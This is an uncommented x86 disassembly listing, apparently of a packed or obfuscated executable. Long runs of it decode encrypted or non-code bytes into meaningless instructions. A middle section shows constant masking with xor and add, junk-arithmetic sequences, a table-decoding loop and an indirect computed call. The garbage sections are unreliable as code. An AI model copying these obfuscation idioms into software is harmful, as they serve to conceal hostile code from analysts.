  4123ad:	jmp    0x412383
  4123af:	mov    ecx,0xffd9b9f4
  4123b4:	(bad)  
  4123b5:	aad    0x5
  4123b7:	(bad)  
  4123b9:	loop   0x41238b
  4123bb:	cmc    
  4123bc:	or     cl,BYTE PTR [eax]
  4123be:	add    DWORD PTR [esi],eax
  4123c0:	sar    BYTE PTR [eax-0x23431c12],0xad
  4123c7:	iret   
  4123c8:	shr    esi,cl
  4123ca:	mov    ebx,0xf6f5ebe6
  4123cf:	enter  0xcfff,0x7
  4123d3:	out    dx,eax
  4123d4:	aad    0x2
  4123d6:	cmc    
  4123d7:	aam    0xdd
  4123d9:	(bad)  
  4123db:	stc    
  4123dc:	(bad)  
  4123dd:	(bad)  
  4123df:	or     bh,ah
  4123e1:	out    0xd2,eax
  4123e3:	(bad)  
  4123e4:	(bad)
  4123e7:	aam    0xef
  4123e9:	loopne 0x4123d1
  4123eb:	mov    eax,0xf8e9d1b8
  4123f0:	cld    
  4123f1:	add    eax,DWORD PTR [ecx]
  4123f3:	ret    0xd6dd
  4123f6:	inc    BYTE PTR [eax]
  4123f8:	loopne 0x4123cf
  4123fa:	jecxz  0x4123f3
  4123fc:	stc    
  4123fd:	loope  0x4123d9
  4123ff:	enter  0xeacc,0xd7
  412403:	fisub  WORD PTR [edi+ecx*8-0x4b1d1e1e]
  41240a:	fmul   st,st(2)
  41240c:	out    0xdc,al
  41240e:	int    0xe2
  412410:	jecxz  0x4123ee
  412412:	mov    esi,0xdcbddcf5
  412417:	(bad)  
  412418:	in     eax,0xfa
  41241a:	ror    dl,1
  41241c:	or     eax,0xea0603c3
  412421:	retf   0xefea
  412424:	rcl    al,cl
  412426:	stos   BYTE PTR es:[edi],al
  412427:	out    0xf1,eax
  412429:	rcl    cl,cl
  41242b:	shr    al,1
  41242d:	int3   
  41242e:	jmp    0xf402:0xd1d3efe3
  412435:	icebp  
  412436:	lock (bad) 
  412439:	fucomip st,st(3)
  41243b:	or     bh,bh
  41243d:	out    0x8,al
  41243f:	add    ah,al
  412441:	stos   BYTE PTR es:[edi],al
  412442:	lds    edi,FWORD PTR [ebp-0x17311a53]
  412448:	int    0xe4
  41244a:	mov    ch,0xdf
  41244c:	jmp    0xc2cd:0x3bdf0d2
  412453:	iret   
  412454:	(bad)  
  412455:	jecxz  0x41245a
  412457:	icebp  
  412458:	shl    dh,0xfb
  41245b:	or     al,bh
  41245d:	sti    
  41245e:	sti    
  41245f:	cli    
  412460:	fucomp st(0)
  412462:	lods   eax,DWORD PTR ds:[esi]
  412463:	loopne 0x41243c
  412465:	lods   eax,DWORD PTR ds:[esi]
  412466:	ror    eax,0xf0
  412469:	in     eax,dx
  41246a:	leave  
  41246b:	aam    0xc4
  41246d:	icebp  
  41246e:	rol    BYTE PTR [ebx],cl
  412470:	xlat   BYTE PTR ds:[ebx]
  412471:	mov    ebx,0xd8d7f4f6
  412476:	in     eax,0xa
  412478:	(bad)  
  412479:	or     cl,BYTE PTR [ecx]
  41247b:	loop   0x41245b
  41247d:	cli    
  41247e:	loope  0x41246e
  412480:	int    0xec
  412482:	loope  0x41244c
  412484:	mul    ecx
  412486:	in     al,0xbb
  412488:	mov    ch,0xfa
  41248a:	imul   eax
  41248c:	mov    ch,0xcb
  41248e:	mov    ch,0xfc
  412490:	ror    dh,cl
  412492:	add    ah,cl
  412494:	cmc    
  412495:	rol    DWORD PTR [ecx],cl
  412497:	(bad)
  41249a:	out    0x2,al
  41249c:	(bad)  
  41249d:	cli    
  41249e:	fcos   
  4124a0:	in     al,dx
  4124a1:	shr    BYTE PTR [esi+edx*8-0xa531852],0xf0
  4124a9:	mov    ah,0xe5
  4124ab:	out    0xb9,eax
  4124ad:	in     eax,dx
  4124ae:	call   0xf83108a3
  4124b3:	rcr    esp,cl
  4124b5:	int3   
  4124b6:	loope  0x4124bb
  4124b8:	jecxz  0x412481
  4124ba:	sti    
  4124bb:	(bad)  
  4124bc:	out    dx,eax
  4124bd:	loop   0x4124c5
  4124bf:	out    dx,al
  4124c0:	inc    bh
  4124c2:	neg    ebp
  4124c4:	out    dx,eax
  4124c5:	in     eax,dx
  4124c6:	(bad)
  4124c9:	sti    
  4124ca:	lock shl cl,1
  4124cd:	(bad)  
  4124ce:	fnstcw WORD PTR [eax-0x9324533]
  4124d4:	(bad)  
  4124d5:	in     eax,dx
  4124d6:	repz push es
  4124d8:	sar    BYTE PTR [edi-0x334f942],0x0
  4124df:	add    DWORD PTR [ecx],ecx
  4124e1:	out    0xb8,al
  4124e3:	call   0xd723d39b
  4124e8:	aam    0xec
  4124ea:	int    0xf4
  4124ec:	cmc    
  4124ed:	(bad)
  4124f0:	fiadd  DWORD PTR [eax]
  4124f2:	hlt    
  4124f3:	shl    dh,cl
  4124f5:	in     eax,dx
  4124f6:	add    al,0xe1
  4124f8:	repnz push es
  4124fa:	aam    0xff
  4124fc:	loopne 0x4124c5
  4124fe:	add    DWORD PTR [ebx],edx
  412500:	push   es
  412501:	ret    0xdeca
  412504:	mov    esi,0xefd0b5e0
  412509:	rcl    dl,1
  41250b:	jmp    0xfdcf:0xfbeadcd7
  412512:	fcomp  st(3)
  412514:	in     eax,0xfd
  412516:	cld    
  412517:	rcr    esp,cl
  412519:	(bad)
  41251c:	clc    
  41251d:	fucom  st(3)
  41251f:	jmp    0xb3a4:0xc5dcaae8
  412526:	leave  
  412527:	out    0xea,al
  412529:	in     al,0xd5
  41252b:	in     eax,0xf2
  41252d:	mov    ebp,0xfef0ddd9
  412532:	mov    esp,0xc2f8fbc3
  412537:	jmp    0x4124f5
  412539:	leave  
  41253a:	jecxz  0x412540
  41253c:	(bad)  
  41253e:	iret   
  41253f:	jecxz  0x41253f
  412541:	mov    dl,0xca
  412543:	scas   al,BYTE PTR es:[edi]
  412544:	mov    dl,0xac
  412546:	test   bl,0xb1
  412549:	out    dx,al
  41254a:	fcmovu st,st(7)
  41254c:	aad    0xd9
  41254e:	cmc    
  41254f:	leave  
  412550:	fcomp  st(1)
  412552:	ffree  st(3)
  412554:	fiadd  WORD PTR [esi]
  412556:	repz aam 0x6
  412559:	or     eax,ebx
  41255b:	out    0x1,al
  41255d:	std    
  41255e:	or     ebp,esi
  412560:	(bad)  
  412562:	shr    BYTE PTR [edi-0x173a2f3e],1
  412568:	mov    dh,0xf0
  41256a:	(bad)  
  41256b:	mov    bh,0xba
  41256d:	shr    ebp,cl
  41256f:	cli    
  412570:	repz lock cmc 
  412573:	fadd   st(0),st
  412575:	stc    
  412576:	in     al,dx
  412577:	mov    ecx,0xa0bf9c3
  41257c:	jmp    0xc5e1:0xc80e0afd
  412583:	(bad)  
  412585:	lods   eax,DWORD PTR ds:[esi]
  412586:	cmc    
  412587:	cli    
  412588:	out    dx,al
  412589:	jmp    0x41255d
  41258b:	in     eax,dx
  41258c:	icebp  
  41258d:	mov    edx,0xbb02f4cb
  412592:	(bad)  
  412594:	mov    esi,0xf4b9e5d4
  412599:	add    bh,ah
  41259b:	fld    QWORD PTR [ecx]
  41259d:	(bad)  
  41259f:	jmp    0xc7f112a2
  4125a4:	cmc    
  4125a5:	(bad)
  4125a9:	(bad)  
  4125aa:	div    eax
  4125ac:	out    dx,al
  4125ad:	jmp    0xbdf5e0a0
  4125b2:	add    bh,dh
  4125b4:	(bad)  
  4125b5:	aam    0xc3
  4125b7:	(bad)  
  4125b8:	fcmovnb st,st(6)
  4125ba:	or     edi,ebp
  4125bc:	or     ebx,edi
  4125be:	retf   
  4125bf:	out    0xcd,eax
  4125c1:	stos   BYTE PTR es:[edi],al
  4125c2:	into   
  4125c3:	fucomip st,st(0)
  4125c5:	aam    0xf7
  4125c7:	icebp  
  4125c8:	shr    esp,1
  4125ca:	out    0xba,eax
  4125cc:	cmc    
  4125cd:	repnz mov ch,0xd7
  4125d0:	cmc    
  4125d1:	mov    edx,0xc7f4f2e0
  4125d6:	cli    
  4125d7:	repz fistp QWORD PTR [edi-0x2f01505]
  4125de:	out    dx,al
  4125df:	push   es
  4125e0:	fdivr  DWORD PTR [edi-0x380f2336]
  4125e6:	repz loopne 0x4125a4
  4125e9:	repz (bad) 
  4125eb:	(bad)  
  4125ed:	call   0x89c22a7d
  4125f2:	inc    ebp
  4125f3:	enter  0x5e9,0x0
  4125f7:	add    BYTE PTR [eax],al
  4125f9:	jmp    0x40d473
  4125fe:	mov    eax,DWORD PTR [ebp-0x2c]
  412601:	mov    ecx,DWORD PTR [ebp-0x3c]
  412604:	xor    ecx,0x75108b5
  41260a:	add    ecx,0x3272fb
  412610:	cmp    eax,ecx
  412612:	jne    0x41262a
  412618:	mov    eax,DWORD PTR [ebp-0x3c]
  41261b:	xor    eax,0x75108b5
  412620:	add    eax,0x3272fb
  412625:	jmp    0x414dde
  41262a:	mov    eax,DWORD PTR [ebp-0x8]
  41262d:	mov    ecx,DWORD PTR [ebp-0x3c]
  412630:	xor    ecx,0x75108b5
  412636:	add    ecx,0x3272fb
  41263c:	cmp    eax,ecx
  41263e:	je     0x41290b
  412644:	lea    eax,[ebp-0x2c]
  412647:	mov    DWORD PTR [ebp-0x13c],eax
  41264d:	mov    eax,DWORD PTR [ebp-0x10]
  412650:	mov    DWORD PTR [ebp-0x138],eax
  412656:	mov    eax,DWORD PTR [ebp+0xc]
  412659:	mov    DWORD PTR [ebp-0x134],eax
  41265f:	mov    eax,DWORD PTR [ebp-0x134]
  412665:	movzx  eax,WORD PTR [eax+0x20]
  412669:	xor    eax,0x8a9a
  41266e:	add    eax,0x3b61
  412673:	movzx  eax,ax
  412676:	mov    DWORD PTR [ebp-0x114],eax
  41267c:	mov    BYTE PTR [ebp-0x85],0x7a
  412683:	lea    eax,[ebp-0x85]
  412689:	mov    DWORD PTR [ebp-0x10c],eax
  41268f:	movzx  eax,BYTE PTR [ebp-0x85]
  412696:	xor    eax,0x83
  41269b:	add    eax,0x8
  41269e:	mov    ecx,DWORD PTR [ebp-0x10c]
  4126a4:	mov    BYTE PTR [ecx],al
  4126a6:	mov    DWORD PTR [ebp-0x118],0xf89c85b0
  4126b0:	mov    DWORD PTR [ebp-0x11c],0xf89c85b3
  4126ba:	mov    eax,DWORD PTR [ebp-0x118]
  4126c0:	xor    eax,0x75108b5
  4126c5:	add    eax,0x3272fb
  4126ca:	mov    DWORD PTR [ebp-0x120],eax
  4126d0:	jmp    0x4126e2
  4126d5:	mov    eax,DWORD PTR [ebp-0x120]
  4126db:	inc    eax
  4126dc:	mov    DWORD PTR [ebp-0x120],eax
  4126e2:	cmp    DWORD PTR [ebp-0x120],0x40
  4126e9:	jae    0x412707
  4126ef:	mov    eax,DWORD PTR [ebp-0x120]
  4126f5:	mov    cl,BYTE PTR [ebp-0x85]
  4126fb:	mov    BYTE PTR [ebp+eax*1-0xc8],cl
  412702:	jmp    0x4126d5
  412707:	mov    eax,DWORD PTR [ebp-0x118]
  41270d:	xor    eax,0x75108b5
  412712:	add    eax,0x3272fb
  412717:	mov    DWORD PTR [ebp-0x124],eax
  41271d:	jmp    0x41272f
  412722:	mov    eax,DWORD PTR [ebp-0x124]
  412728:	inc    eax
  412729:	mov    DWORD PTR [ebp-0x124],eax
  41272f:	mov    eax,DWORD PTR [ebp-0x114]
  412735:	cmp    DWORD PTR [ebp-0x124],eax
  41273b:	je     0x412791
  412741:	mov    eax,DWORD PTR [ebp-0x124]
  412747:	mov    ecx,DWORD PTR [ebp-0x134]
  41274d:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  412752:	xor    eax,0x8a9a
  412757:	add    eax,0x3b61
  41275c:	movzx  eax,ax
  41275f:	mov    DWORD PTR [ebp-0x128],eax
  412765:	mov    eax,DWORD PTR [ebp-0x124]
  41276b:	mov    ecx,DWORD PTR [ebp-0x134]
  412771:	movzx  eax,WORD PTR [ecx+eax*4]
  412775:	xor    eax,0x8a9a
  41277a:	add    eax,0x3b61
  41277f:	mov    ecx,DWORD PTR [ebp-0x128]
  412785:	mov    BYTE PTR [ebp+ecx*1-0xc8],al
  41278c:	jmp    0x412722
  412791:	mov    eax,DWORD PTR [ebp-0x118]
  412797:	xor    eax,0x75108b5
  41279c:	add    eax,0x3272fb
  4127a1:	mov    ecx,DWORD PTR [ebp-0x13c]
  4127a7:	mov    DWORD PTR [ecx],eax
  4127a9:	mov    eax,DWORD PTR [ebp-0x118]
  4127af:	xor    eax,0x75108b5
  4127b4:	add    eax,0x3272fb
  4127b9:	mov    DWORD PTR [ebp-0x110],eax
  4127bf:	mov    DWORD PTR [ebp-0x84],0xf89c95b0
  4127c9:	mov    eax,DWORD PTR [ebp-0x84]
  4127cf:	xor    eax,0x75108b5
  4127d4:	add    eax,0x3272fb
  4127d9:	je     0x4128ee
  4127df:	lea    eax,[ebp-0x130]
  4127e5:	mov    DWORD PTR [ebp-0x12c],eax
  4127eb:	mov    eax,DWORD PTR [ebp-0x110]
  4127f1:	sub    eax,0x3272fb
  4127f6:	xor    eax,0x75108b5
  4127fb:	mov    ecx,DWORD PTR [ebp-0x12c]
  412801:	mov    DWORD PTR [ecx],eax
  412803:	mov    eax,DWORD PTR [ebp-0x84]
  412809:	xor    eax,0x75108b5
  41280e:	add    eax,0x3272fb
  412813:	mov    ecx,DWORD PTR [ebp-0x11c]
  412819:	xor    ecx,0x75108b5
  41281f:	add    ecx,0x3272fb
  412825:	sub    eax,ecx
  412827:	sub    eax,0x3272fb
  41282c:	xor    eax,0x75108b5
  412831:	mov    DWORD PTR [ebp-0x84],eax
  412837:	mov    eax,DWORD PTR [ebp-0x110]
  41283d:	movsx  eax,BYTE PTR [ebp+eax*1-0xc8]
  412845:	movsx  ecx,BYTE PTR [ebp-0x85]
  41284c:	cmp    eax,ecx
  41284e:	je     0x4128c6
  412854:	mov    eax,DWORD PTR [ebp-0x110]
  41285a:	movsx  eax,BYTE PTR [ebp+eax*1-0xc8]
  412862:	mov    ecx,DWORD PTR [ebp-0x130]
  412868:	xor    ecx,0x75108b5
  41286e:	mov    edx,DWORD PTR [ebp-0x138]
  412874:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fb]
  41287c:	cmp    eax,ecx
  41287e:	je     0x41288e
  412884:	jmp    0x412906
  412889:	jmp    0x4128c6
  41288e:	mov    eax,DWORD PTR [ebp-0x130]
  412894:	xor    eax,0x75108b5
  412899:	mov    ecx,DWORD PTR [ebp-0x138]
  41289f:	movsx  eax,BYTE PTR [ecx+eax*1+0x3272fb]
  4128a7:	mov    ecx,DWORD PTR [ebp-0x118]
  4128ad:	xor    ecx,0x75108b5
  4128b3:	add    ecx,0x3272fb
  4128b9:	cmp    eax,ecx
  4128bb:	jne    0x4128c6
  4128c1:	jmp    0x4128ee
  4128c6:	mov    eax,DWORD PTR [ebp-0x11c]
  4128cc:	xor    eax,0x75108b5
  4128d1:	mov    ecx,DWORD PTR [ebp-0x110]
  4128d7:	lea    eax,[ecx+eax*1+0x3272fb]
  4128de:	mov    DWORD PTR [ebp-0x110],eax
  4128e4:	jmp    0x4127c9
  4128e9:	jmp    0x4127c9
  4128ee:	mov    eax,DWORD PTR [ebp-0x11c]
  4128f4:	xor    eax,0x75108b5
  4128f9:	add    eax,0x3272fb
  4128fe:	mov    ecx,DWORD PTR [ebp-0x13c]
  412904:	mov    DWORD PTR [ecx],eax
  412906:	jmp    0x41023e
  41290b:	mov    eax,DWORD PTR [ebp+0x8]
  41290e:	add    eax,DWORD PTR [ebp-0x38]
  412911:	mov    DWORD PTR [ebp-0x34],eax
  412914:	cmp    DWORD PTR [ebp-0x28],0x0
  412918:	je     0x4129d7
  41291e:	mov    DWORD PTR [ebp-0x4c],0x0
  412925:	push   edx
  412926:	pop    eax
  412927:	push   0x5
  412929:	sub    edx,eax
  41292b:	pop    edx
  41292c:	add    edx,0xa
  41292f:	push   edx
  412930:	pop    ecx
  412931:	push   0xa
  412933:	dec    ecx
  412934:	pop    ebx
  412935:	dec    ebx
  412936:	xchg   ebx,ecx
  412938:	sub    ebx,ecx
  41293a:	xchg   ebx,ecx
  41293c:	dec    ecx
  41293d:	mov    eax,DWORD PTR [ebp-0x28]
  412940:	imul   eax,ecx
  412943:	sub    esp,eax
  412945:	mov    DWORD PTR [ebp-0x4c],esp
  412948:	mov    eax,DWORD PTR [ebp-0x3c]
  41294b:	xor    eax,0x75108b5
  412950:	add    eax,0x3272fb
  412955:	mov    DWORD PTR [ebp-0x48],eax
  412958:	mov    eax,DWORD PTR [ebp-0x3c]
  41295b:	xor    eax,0x75108b5
  412960:	mov    ecx,DWORD PTR [ebp-0x48]
  412963:	lea    eax,[ecx+eax*1+0x3272fb]
  41296a:	mov    ecx,DWORD PTR [ebp-0x40]
  41296d:	xor    ecx,0x75108b5
  412973:	add    ecx,0x3272fb
  412979:	mov    edx,DWORD PTR [ebp+0x14]
  41297c:	imul   ecx,DWORD PTR [edx]
  41297f:	cmp    eax,ecx
  412981:	je     0x4129d7
  412987:	mov    ecx,DWORD PTR [ebp-0x3c]
  41298a:	xor    ecx,0x75108b5
  412990:	mov    esi,DWORD PTR [ebp-0x40]
  412993:	xor    esi,0x75108b5
  412999:	add    esi,0x3272fb
  41299f:	mov    eax,DWORD PTR [ebp-0x48]
  4129a2:	mov    edx,DWORD PTR [ebp+0x14]
  4129a5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4129a9:	xor    edx,edx
  4129ab:	div    esi
  4129ad:	lea    eax,[ecx+eax*1+0x3272fb]
  4129b4:	mov    ecx,DWORD PTR [ebp-0x48]
  4129b7:	mov    edx,DWORD PTR [ebp-0x4c]
  4129ba:	mov    DWORD PTR [edx+ecx*4],eax
  4129bd:	mov    eax,DWORD PTR [ebp-0x40]
  4129c0:	xor    eax,0x75108b5
  4129c5:	mov    ecx,DWORD PTR [ebp-0x48]
  4129c8:	lea    eax,[ecx+eax*1+0x3272fb]
  4129cf:	mov    DWORD PTR [ebp-0x48],eax
  4129d2:	jmp    0x412958
  4129d7:	mov    eax,DWORD PTR [ebp-0x3c]
  4129da:	xor    eax,0x75108b5
  4129df:	add    eax,0x3272fb
  4129e4:	mov    DWORD PTR [ebp-0x1c],eax
  4129e7:	and    ebx,0x76575654
  4129ed:	xor    ebx,0x54354364
  4129f3:	xchg   ebx,esi
  4129f5:	xor    ebx,ebx
  4129f7:	push   esi
  4129f8:	mov    esi,ebx
  4129fa:	pop    ebx
  4129fb:	mov    edx,esi
  4129fd:	add    ebx,0x1002
  412a03:	lea    eax,[ebp-0x34]
  412a06:	add    edx,eax
  412a08:	add    edx,0x5
  412a0b:	push   edx
  412a0c:	inc    esi
  412a0d:	pop    ecx
  412a0e:	dec    ecx
  412a0f:	xchg   ecx,eax
  412a10:	dec    eax
  412a11:	xchg   ecx,eax
  412a12:	dec    ecx
  412a13:	xchg   ecx,edx
  412a15:	dec    edx
  412a16:	push   edx
  412a17:	mov    edx,ebx
  412a19:	pop    ebx
  412a1a:	dec    ebx
  412a1b:	call   DWORD PTR [ebx]
  412a1d:	cmp    DWORD PTR [ebp+0x10],esi
  412a20:	je     0x412a41
  412a26:	xchg   edx,eax
  412a27:	push   0xc
  412a29:	pop    ecx
  412a2a:	dec    ecx
  412a2b:	push   0x3
  412a2d:	pop    ebx
  412a2e:	inc    ebx
  412a2f:	xchg   ebx,ecx
  412a31:	inc    ecx
  412a32:	sub    ebx,ecx
  412a34:	xchg   ebx,ecx
  412a36:	dec    ecx
  412a37:	dec    ecx
  412a38:	mov    eax,DWORD PTR [ebp-0x28]
  412a3b:	imul   eax,ecx
  412a3e:	add    esp,eax
  412a40:	xchg   edx,eax
  412a41:	push   eax
  412a42:	jmp    0x414dcb
  412a47:	ret    0xc368
  412a4a:	ret    
  412a4b:	jno    0x412abd
  412a4d:	ret    0x1568
  412a50:	rcl    BYTE PTR [edx],cl
  412a52:	clc    
  412a53:	adc    al,0x33
  412a55:	mov    dh,0xb4
  412a57:	inc    esi
  412a58:	ins    DWORD PTR es:[edi],dx
  412a59:	jnp    0x412ad6
  412a5b:	out    0x98,eax
  412a5d:	jnp    0x412ada
  412a5f:	mov    ah,0xdd
  412a61:	(bad)  
  412a63:	(bad)  
  412a64:	shl    al,1
  412a66:	add    ch,bl
  412a68:	aad    0xdc
  412a6a:	cmc    
  412a6b:	out    0xe1,al
  412a6d:	iret   
  412a6e:	in     eax,0xfb
  412a70:	(bad)  
  412a71:	jmp    0x412a5d
  412a73:	iret   
  412a74:	loope  0x412a63
  412a76:	mov    bh,0xec
  412a78:	in     eax,dx
  412a79:	mov    ah,0xed
  412a7b:	int    0xea
  412a7d:	iret   
  412a7e:	iret   
  412a7f:	mov    eax,0xeec9d2df
  412a84:	ret    0xdef9
  412a87:	fcomi  st,st(5)
  412a89:	loopne 0x412a85
  412a8b:	or     eax,DWORD PTR [esi+edx*8]
  412a8e:	lds    ecx,FWORD PTR [eax]
  412a90:	jecxz  0x412a6a
  412a92:	out    dx,eax
  412a93:	mov    cl,0xe6
  412a95:	loopne 0x412a61
  412a97:	jecxz  0x412a69
  412a99:	lods   al,BYTE PTR ds:[esi]
  412a9a:	int3   
  412a9b:	iret   
  412a9c:	int3   
  412a9d:	cmc    
  412a9e:	mov    edi,0xe2b4f5d9
  412aa3:	(bad)  
  412aa5:	int    0xdc
  412aa7:	test   BYTE PTR [edx+eiz*8],0xeb
  412aab:	jmp    0x13462bb6
  412ab0:	ror    DWORD PTR ds:0xf3a5afdd,cl
  412ab6:	shl    al,cl
  412ab8:	out    0xd7,eax
  412aba:	(bad)  
  412abb:	rol    dh,cl
  412abd:	out    0xff,al
  412abf:	mov    esi,0xdcf6bcff
  412ac4:	in     eax,dx
  412ac5:	mov    eax,0x5d6dbd4
  412aca:	ret    
  412acb:	div    bh
  412acd:	aam    0xec
  412acf:	fdivp  st(0),st
  412ad1:	dec    al
  412ad3:	in     al,dx
  412ad4:	mov    esi,0xb4c3d3ee
  412ad9:	(bad)  
  412ada:	icebp  
  412adb:	out    0xf5,al
  412add:	fcomip st,st(2)
  412adf:	aam    0xf5
  412ae1:	loop   0x412ac2
  412ae3:	rol    eax,1
  412ae5:	add    ah,bl
  412ae7:	cld    
  412ae8:	ret    0xdbdd
  412aeb:	lock loope 0x412ad1
  412aee:	(bad)  
  412aef:	clc    
  412af0:	psraw  mm0,mm3
  412af3:	out    0xa5,eax
  412af5:	rcl    al,0xf1
  412af8:	lods   al,BYTE PTR ds:[esi]
  412af9:	mov    cl,0xd3
  412afb:	(bad)  
  412afc:	clc    
  412afd:	mov    al,0xd8
  412aff:	(bad)  
  412b01:	iret   
  412b02:	stc    
  412b03:	int3   
  412b04:	shl    bh,0x2
  412b07:	not    esp
  412b09:	hlt    
  412b0a:	(bad)  
  412b0b:	jecxz  0x412b05
  412b0d:	loopne 0x412add
  412b0f:	jmp    0x412b0b
  412b11:	icebp  
  412b12:	repz enter 0xe8e0,0xdc
  412b17:	mov    cl,0xd1
  412b19:	fcmovnbe st,st(7)
  412b1b:	sti    
  412b1c:	jmp    0x412ad9
  412b1e:	stc    
  412b1f:	fdivrp st(0),st
  412b21:	(bad)  
  412b22:	repnz mov esi,0xe5d7fc02
  412b28:	out    0xcb,eax
  412b2a:	cld    
  412b2b:	xlat   BYTE PTR ds:[ebx]
  412b2c:	(bad)  
  412b2f:	in     al,0xe3
  412b31:	call   0xdd200417
  412b36:	enter  0xc3d7,0xd3
  412b3a:	out    0xe9,al
  412b3c:	int3   
  412b3d:	div    al
  412b3f:	fcmovne st,st(6)
  412b41:	stc    
  412b42:	in     eax,dx
  412b43:	loop   0x412b3f
  412b45:	pop    es
  412b46:	(bad)  
  412b48:	cmc    
  412b49:	cmc    
  412b4a:	retf   0x6cb
  412b4d:	add    eax,0xffe07ee
  412b52:	jmp    0xd50cf538
  412b57:	out    dx,eax
  412b58:	icebp  
  412b59:	call   0xf91af155
  412b5e:	jmp    0xc21c2140
  412b63:	fsubrp st(7),st
  412b65:	clc    
  412b66:	out    0xdf,eax
  412b68:	sar    dh,1
  412b6a:	aad    0xe4
  412b6c:	(bad)  
  412b6d:	into   
  412b6e:	loopne 0x412b6a
  412b70:	(bad)  
  412b72:	test   eax,0xe7ecf6d0
  412b77:	int3   
  412b78:	out    dx,al
  412b79:	mov    bl,0xe1
  412b7b:	mov    al,0xb7
  412b7d:	fmul   st,st(5)
  412b7f:	shl    BYTE PTR [ebp+edi*8+0xc3b6bc],1
  412b86:	fdivp  st(4),st
  412b88:	ror    DWORD PTR [ecx],cl
  412b8a:	add    dh,ch
  412b8c:	add    edx,ebp
  412b8e:	leave  
  412b8f:	fcmovbe st,st(3)
  412b91:	loope  0x412b58
  412b93:	mov    cl,0xc0
  412b95:	mov    bl,0xb2
  412b97:	shr    eax,0xb4
  412b9a:	lock (bad) 
  412b9c:	lods   eax,DWORD PTR ds:[esi]
  412b9d:	jmp    0xd0e0:0xdefbd7bf
  412ba4:	fcmovu st,st(3)
  412ba6:	xlat   BYTE PTR ds:[ebx]
  412ba7:	(bad)  
  412ba8:	in     al,0xa
  412baa:	out    0xe6,eax
  412bac:	or     bl,ah
  412bae:	push   cs
  412baf:	out    dx,eax
  412bb0:	fisttp QWORD PTR [ecx+ecx*8]
  412bb3:	repz out dx,al
  412bb5:	out    dx,eax
  412bb6:	jmp    0xcccd:0xd0f9d3ec
  412bbd:	mov    esi,0xefebcccd
  412bc2:	leave  
  412bc3:	out    0x1,eax
  412bc5:	icebp  
  412bc6:	add    al,0x1
  412bc8:	in     al,0xd0
  412bca:	fsubr  st(1),st
  412bcc:	fidivr WORD PTR [esp+ecx*1-0x3223f4fc]
  412bd3:	repnz rcl ecx,0xcc
  412bd7:	jmp    0xe6f715a2
  412bdc:	call   0xbb2c01a6
  412be1:	add    dh,dl
  412be3:	cli    
  412be4:	mov    esp,0xfbf0dfe7
  412be9:	loop   0x412bb2
  412beb:	aad    0x8
  412bed:	into   
  412bee:	in     al,dx
  412bef:	fdivr  st,st(6)
  412bf1:	call   0xbd120eb2
  412bf6:	loope  0x412bd8
  412bf8:	loopne 0x412bc8
  412bfa:	fcmovbe st,st(4)
  412bfc:	lock mov ebx,0xd0b8ebcd
  412c02:	aad    0xe3
  412c04:	fdiv   QWORD PTR [esi+eax*8-0x3b3b0000]
  412c0b:	les    ecx,FWORD PTR [edx]
  412c0d:	retf   0xc40f
  412c10:	or     al,0xdc
  412c12:	mov    ecx,0xb1e8c2b1
  412c17:	call   0xf6fd02d7
  412c1c:	(bad)  
  412c1d:	call   0xba0efd0e
  412c22:	int    0xd4
  412c24:	stc    
  412c25:	fdivrp st(4),st
  412c27:	fdivrp st(1),st
  412c29:	fdivp  st(1),st
  412c2b:	(bad)  
  412c2d:	retf   0xe4eb
  412c30:	fsubp  st(2),st
  412c32:	shl    dl,0xbe
  412c35:	int    0xae
  412c37:	mov    cl,0xfb
  412c39:	iret   
  412c3a:	fcmovnbe st,st(7)
  412c3c:	(bad)  
  412c3e:	retf   0xc8b9
  412c41:	std    
  412c42:	xlat   BYTE PTR ds:[ebx]
  412c43:	(bad)  
  412c45:	mov    ebp,0xd7f7d8d5
  412c4a:	cli    
  412c4b:	idiv   al
  412c4d:	clc    
  412c4e:	aam    0xe2
  412c50:	(bad)  
  412c51:	shl    al,cl
  412c53:	shr    ebp,cl
  412c55:	scas   eax,DWORD PTR es:[edi]
  412c56:	shl    ecx,0xb7
  412c59:	mov    bh,0xd5
  412c5b:	mov    edx,0xf5cfcdc7
  412c60:	mov    edi,0xeefdecc3
  412c65:	loope  0x412c4a
  412c67:	(bad)  
  412c69:	out    0xe4,al
  412c6b:	or     edx,ecx
  412c6d:	loope  0x412c4a
  412c6f:	leave  
  412c70:	push   cs
  412c71:	enter  0xebab,0xcc
  412c75:	in     eax,dx
  412c76:	in     eax,0xb6
  412c78:	rol    cl,cl
  412c7a:	mov    edx,0xd1facdc4
  412c7f:	int    0x2
  412c81:	int    0xe8
  412c83:	std    
  412c84:	cli    
  412c85:	out    dx,al
  412c86:	fcmovbe st,st(3)
  412c88:	out    0x6,eax
  412c8a:	fadd   st,st(4)
  412c8c:	(bad)  
  412c8d:	retf   0xbc6
  412c90:	fld    st(0)
  412c92:	out    0xca,al
  412c94:	mov    esp,0xfbb4adc6
  412c99:	retf   
  412c9a:	ror    ah,0xd0
  412c9d:	out    dx,eax
  412c9e:	(bad)  
  412c9f:	xlat   BYTE PTR ds:[ebx]
  412ca0:	ror    edi,1
  412ca2:	aam    0xbf
  412ca4:	sti    
  412ca5:	sti    
  412ca6:	in     al,dx
  412ca7:	loop   0x412ca6
  412ca9:	(bad)
  412cac:	(bad)  
  412cae:	aad    0xe2
  412cb0:	std    
  412cb1:	add    dl,dl
  412cb3:	in     al,0xb1
  412cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb6:	(bad)  
  412cb7:	mov    ah,0xca
  412cb9:	mov    al,0xb7
  412cbb:	jmp    0xbaf72677
  412cc0:	int    0xbb
  412cc2:	(bad)  
  412cc3:	out    0xe0,eax
  412cc5:	int    0xc7
  412cc7:	std    
  412cc8:	icebp  
  412cc9:	loopne 0x412c8f
  412ccb:	sar    ebp,0xff
  412cce:	in     al,0xe7
  412cd0:	clc    
  412cd1:	fsubr  DWORD PTR [ebp-0x15415631]
  412cd7:	lods   al,BYTE PTR ds:[esi]
  412cd8:	div    DWORD PTR [esi-0x17011a0f]
  412cde:	leave  
  412cdf:	ror    edx,1
  412ce1:	loope  0x412cbf
  412ce3:	shl    ch,0xd5
  412ce6:	add    dl,bl
  412ce8:	(bad)  
  412ce9:	mov    eax,0xeddc0505
  412cee:	push   cs
  412cef:	in     eax,0xf2
  412cf1:	or     ah,bh
  412cf3:	iret   
  412cf4:	lods   eax,DWORD PTR ds:[esi]
  412cf5:	fst    st(7)
  412cf7:	mov    esp,0xc5f8e1da
